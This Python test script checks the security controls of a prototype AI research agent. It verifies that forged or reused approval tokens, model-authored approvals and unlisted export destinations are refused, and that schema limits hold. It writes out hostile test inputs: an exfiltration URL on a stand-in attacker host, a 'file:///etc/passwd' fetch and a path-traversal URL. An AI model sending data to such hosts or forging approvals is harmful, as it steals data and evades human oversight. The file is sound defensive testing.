#!/usr/bin/env python3
"""Control tests — asserts the threat-model controls that dataset cases do not cover.

`eval/harness.py` exercises controls through whole runs. Some controls are only
reachable by driving a boundary directly: the report-hash binding on an approval
token, the destination allowlist, contract range enforcement, and the structural
closure of the model→long-term-memory path. Without these, four rows of
`threat-model/threat-mitigation-matrix.json` would say "tested by: manual".

    python3 eval/control_tests.py

Exit 0 = every control holds.
"""

from __future__ import annotations

import secrets
import sys
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent / "prototype"))

from agent import Orchestrator, RunConfig  # noqa: E402
from agent.contracts import (  # noqa: E402
    ExportReportIn,
    FetchIn,
    SearchIn,
    ValidationError,
)
from agent.memory import LongTermMemory  # noqa: E402
from agent.tools import TOOLS  # noqa: E402

RESULTS: list[tuple[str, str, bool, str]] = []


def check(control: str, name: str, condition: bool, detail: str = "") -> None:
    RESULTS.append((control, name, condition, detail))


QUESTION = "How does durable execution checkpointing help long-running agent runs?"


def approved_run(base: Path):
    """Drive a run to awaiting_approval and mint a legitimate token for it."""
    o = Orchestrator(
        RunConfig(
            question=QUESTION,
            base_dir=base,
            export_destination="file://reports/x.md",
            quiet=True,
            latency_speed=0,
        )
    )
    result = o.run()
    o2 = Orchestrator(
        RunConfig(question=QUESTION, run_id=result.run_id, base_dir=base, quiet=True, latency_speed=0)
    )
    pending = o2.store.get(result.run_id, "awaiting_approval")
    token = secrets.token_urlsafe(16)
    o2.store.put_approval(result.run_id, token, pending["report_hash"], "alice", "approved")
    o2.ctx.approval = {"token": token, "report_hash": pending["report_hash"], "approver": "alice"}
    return o2, pending, token


def test_write_tool_controls(base: Path) -> None:
    o, pending, token = approved_run(base)
    ctx = o.ctx

    def export(**over):
        payload = {
            "destination": pending["destination"],
            "report_markdown": pending["report_markdown"],
            "confirmed_by": token,
        }
        payload.update(over)
        authored = over.pop("_model_authored", False)
        return TOOLS["export_report"].invoke(payload, ctx, None, model_authored=authored)

    # C7 — the token is bound to the approved report's hash
    r = export(report_markdown=pending["report_markdown"] + "\n- extra claim [S1]")
    check("C7", "report modified after approval is refused", not r.ok and r.error_kind == "unconfirmed_export", r.error or "")

    # C8 — destination allowlist
    r = export(destination="https://exfil.attacker.example/collect")
    check("C8", "non-allowlisted destination is refused", not r.ok and r.error_kind == "not_allowlisted", r.error or "")

    # C6 — a token the gate never issued
    r = export(confirmed_by="operator-approved")
    check("C6", "forged confirmation token is refused", not r.ok and r.error_kind == "unconfirmed_export", r.error or "")

    # C5 — model-authored payload: confirmed_by is stripped before validation
    r = TOOLS["export_report"].invoke(
        {"destination": pending["destination"], "report_markdown": pending["report_markdown"], "confirmed_by": token},
        ctx, None, model_authored=True,
    )
    check("C5", "model-authored payload cannot carry confirmed_by", not r.ok and r.error_kind == "unconfirmed_export", r.error or "")

    # positive control: the legitimate path must still work, or the tests above prove nothing
    r = export()
    check("C6+", "legitimate gate-authored export succeeds", r.ok, r.error or "")


def test_contract_controls() -> None:
    # C11 — range enforcement caps model-driven fan-out cost
    for bad in (0, 21, 999):
        try:
            SearchIn.parse({"query": "hybrid search", "max_results": bad})
            check("C11", f"max_results={bad} rejected", False, "accepted out-of-range value")
        except ValidationError:
            check("C11", f"max_results={bad} rejected", True)
    try:
        SearchIn.parse({"query": "ab"})
        check("C11", "too-short query rejected", False, "accepted")
    except ValidationError:
        check("C11", "too-short query rejected", True)

    # unknown fields must be rejected, not ignored
    try:
        SearchIn.parse({"query": "hybrid search", "admin": True})
        check("C11", "unknown field rejected", False, "silently accepted an invented key")
    except ValidationError:
        check("C11", "unknown field rejected", True)

    # C17 — transport shape enforced at the boundary
    for bad in ("http://research.example.org/x", "file:///etc/passwd", "https://a/../../etc"):
        try:
            FetchIn.parse({"url": bad})
            check("C17", f"rejected {bad}", False, "accepted")
        except ValidationError:
            check("C17", f"rejected {bad}", True)
    try:
        FetchIn.parse({"url": "https://research.example.org/ok"})
        check("C17", "accepts a well-formed https url", True)
    except ValidationError as exc:
        check("C17", "accepts a well-formed https url", False, str(exc))

    # C5 — MODEL_FORBIDDEN is declared on the write contract
    check(
        "C5",
        "confirmed_by is declared MODEL_FORBIDDEN",
        "confirmed_by" in ExportReportIn.MODEL_FORBIDDEN,
    )
    stripped = ExportReportIn.parse_model_authored(
        {"destination": "file://reports/x.md", "report_markdown": "x", "confirmed_by": "forged"}
    )
    check("C5", "parse_model_authored blanks confirmed_by", stripped.confirmed_by == "", repr(stripped.confirmed_by))


def test_long_term_memory_controls(base: Path) -> None:
    ltm = LongTermMemory(base / "ltm_test.json")

    # TB4 — writes require an attributed actor and reason; there is no model path here
    try:
        ltm.write("source_allowlist", "attacker.example", True, actor="model", reason="n/a")
        check("TB4", "non-dict section is not writable", False, "allowed a write to a list section")
    except KeyError:
        check("TB4", "non-dict section is not writable", True)

    check("C8", "attacker destination not allowlisted", not ltm.allowlisted_destination("https://exfil.attacker.example/collect"))
    check("C8", "configured destination allowlisted", ltm.allowlisted_destination("file://reports/out.md"))
    check("C17", "attacker host not on source allowlist", not ltm.allowlisted_source("exfil.attacker.example"))
    check("C17", "curated host on source allowlist", ltm.allowlisted_source("research.example.org"))

    # audited write path
    ltm.write("report_dedupe_keys", "abc123", 1.0, actor="hitl:alice", reason="test")
    check("C19", "long-term writes are audited with an actor", bool(ltm.audit) and ltm.audit[-1]["actor"] == "hitl:alice")


def main() -> int:
    with tempfile.TemporaryDirectory() as tmp:
        base = Path(tmp) / "runs"
        test_write_tool_controls(base)
        test_contract_controls()
        test_long_term_memory_controls(base)

    width = max(len(n) for _, n, _, _ in RESULTS)
    failed = 0
    print(f"{'control':8} {'assertion':{width}} result")
    for control, name, ok, detail in RESULTS:
        print(f"{control:8} {name:{width}} {'ok' if ok else 'FAIL'}" + (f"  ({detail})" if detail and not ok else ""))
        failed += not ok
    print()
    if failed:
        print(f"FAIL — {failed} of {len(RESULTS)} control assertions did not hold")
        return 1
    print(f"OK — all {len(RESULTS)} control assertions hold")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
